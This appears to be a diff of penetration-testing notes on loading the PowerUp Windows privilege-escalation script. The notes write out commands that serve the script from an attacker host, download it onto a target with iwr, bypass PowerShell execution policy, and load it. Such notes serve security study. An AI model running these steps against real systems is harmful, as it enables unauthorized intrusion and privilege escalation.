@@ -32,9 +32,14 @@ Explicitly a Windows enumeration and privesc tool. Nb. This tool (like most) sho
 cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
 python3 -m http.server 80
 ```
+Load the Powershell module:
 ```powershell
 iwr -uri http://<our IP>/PowerUp.ps1 -Outfile PowerUp.ps1
+```
+```powershell
 powershell -ep bypass
+```
+```powershell
 . .\PowerUp.ps1
 ```
 To find Binaries that run with privilege that can be modified:
